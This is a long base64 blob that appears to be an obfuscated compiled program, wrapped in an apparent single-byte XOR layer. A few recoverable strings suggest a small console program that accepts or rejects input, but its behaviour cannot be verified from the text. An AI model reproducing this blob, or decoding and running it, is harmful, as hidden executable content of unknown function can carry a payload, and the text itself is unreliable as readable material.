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Tk5CZlpGbkZ6eFxcXF5SVlZ6em5Sbl5OSlpCdm5aVlpCdl5aXk52YmZCZlpuWm5MXF5ufkpmUlZeYm5mbmZKdkJSfk5SZlJGbmJGcmJ6Vn5qakZSbnp6Yk5IXFxcXkpOTmpiUmJSWmpmflJaUnZqUkJ+QlZWVkZWfnZqemZOQnJCanZkXF5+RnZWUlJ+YlpqakpSampGdk5yckZ6clZaRnJ4XFxcXl5uTnpWbkZWdmpmTmpGQlZualpmflJqSlJmZlZiekpCQlZiQFxcXF5STlpqVmZacnJ6Ql5adlJ6alp6fk5+cnpqRkZCdn5mcFxcXF5KZm5udnZiYnJidnpiblJ2RkZuRkJsXF5CSl5mblpebkZ+fn5ybl5CZn5SQkJmXkpydnJWfnpudkpWcnpOYl58XFxcXnpednpOWmpiSmZafmp+Zm52fmZ6ckpySlpIXF5uYkZ6VmpiXnp0XF5aTm5GYmp+Zm5MXF5yek52ck5yVl5uSlp+dmpubk5KWlZCanxcXFxeWnpWXnJWYk5GZmp+XmJafFxcXF5KUk5CQm52dnpaXn5yZnpKWkJGVlpGTnJCXl5sXFxcXmJ2XkJCdk56TmJGSl5mRlJOck5IXFxcXl5yflZSSm5+ZmpGUFxcXF52SmJ+Sk5eVnJuelp6YnZ+bkpiQkp6UlJSUnpeelp2ZFxcXF5iQmJqdkp2Xm5+YlZuXFxeQm5CfkZqXnJCZkJyTmpiTm5uekpqYkJqZlJWQnp6fnJqfmpCZlJaVlJEXF5yfn5SYkpqdnp6elJOTmpCXnJGTm5eamJSXkJ0XFxcXlpKRmZmVl5CZmJ6XmJWdnpCVmp6Sl52emZeQlJKVnJiXlpeUl5mQk5OblZaWm52Wn5qSkhcXFxeRl5SUnZOfn5OfkJMXFxcXlJKUl5qVnpKYl5SdlZ6YnZ6XkpickZaUk5eRmBcXFxeWkZGdk5aWmpKQk5eWmJGWkpuYlpeekJeXnp2UFxcXF56Vm5Kekpman5ianpWUkpOWlpmZmZiekZGakZuSl5KTkJqck5Kfk5SbnpeUkZqTkhcXFxeWkZCQlZiYnpqSmZGfk5STmJWanZuWm56cmpmTFxcXF5mXnpiQmJKfm5KUlZ2bmJSRlZSVl5cXF5KQmJGSmpeQm5ufl5WXkpyakpaWkZuWmhcXFxeYl5eXk5SSkZKalJCTmp6QnJKXmpyUmJSQkZGRkp6Zm5GWFxedn5STkZmYlJCckpGVlJ2TkJOQm52Qmpack5aaFxcXF5iWkJ6TlZuWkZ2blpicl5+YmJWXkpGUn5efl5qYn5iUnZ+SlJOVFxeQmJeSnZWVnpmQkpSXm5KSmZqenZWQn5Wbn5eVm5iWm5KXlJOXmJOfmZIXF5iUmpudn5KTmZKUn56Vn5KSlZGemZ+ck5KaFxefmpacmpiQlpaYlpiVlJSen5SYnJGVkJOTlZmUmZabnZ6amZidkpyUkZGVlJmWkpecnZufFxcXF5aWlpOYkpSSlpifm56clpydk5CWnp+Tl5+cFxeakZualpmRnJeUmpiSn5iZk5+TnJyUkJKUlZaUkJIXF5GTnZaSn5mXmpmbnpaRFxedmJmYlpWbkhcXFxeTm5aRnpSZlZmflJcXFxcXl5qQlZ6XlJ2Vkpudnp2ampyUk52VkZCSnpeYlJKQl5+Ulp+enZMXF52VkJSYkZeRmZ6SlJyWnJackJadnpSSmZSYnZWRk5STnJ6Ump2el5SUkZiZl5mVmRcXFxeTnpOamZiVlZOWlZSblZSTlZSdl5yWmJWdkZaRkp+UmJublpecnJSenZuVnJOel56Wlp+ZFxcXF5OekJqYnZSYmZicnZeZnpeVlpSQmpeSmZyXlpSWmJiQn5uWmJCXk5GVkZ2QmJedmJKXFxealpmSlJual5WampuSnJyfl5ORmZyQk5WTkJiQkJmSnpuRk56VlpGanpSbnZyUFxeXn5aTnpmdlpmUk5iblJqVFxcXF56cm5yRl5iSkpSemJmTk54XFxcXkpmbl52ck5CdlJSSn5qek5qcmJ2TmJOUk5CQmpebmZ2akRcXm5aRmpmXkpuamp2bmZqVmJqcFxeYlZmcnp6empuYkJOTkpiQk52dlJuampoXFxcXm5SWk52TkpCbkJ6dmp2XkZ6fk5aclpWdkZaRn5SanpmTkJuXkZuTl5KQFxeclpCfmpOTm5uSkpWWmpOSl5GUlp2WlJCWl5uSmJ6fmZaQmJGamJqRmpkXF5eXlZmXlJ+VnZiel5yYlpKSkpiSm56YlZ+flZmSkJeRkpufkpeYk5WakBcXnJifmZKbl5mUk5uen5uWmZCVmZiclJSUkJeXkBcXFxeZnJiZmZ2cl5GYkpmcnZaXkZ6RlJSRlJWYkpCSmZiRmpCekZCelxcXn5mfmJSdmpeVlpubnpiflZibl5SekpibnZ6QnZOZmJYXFxcXmp2Vm5qdlpmSkpmUlJOVnZ6XkpKZkJaVl56blJyRkZ6dn5iVlJGUn5SXl5qYlJCeFxcXF5iSkpKen5KYmpCdn5OXnJWUkpmRm5Wal5+Yl5iWmhcXk5eSkZacnZyVl5Cbk52dnJGUFx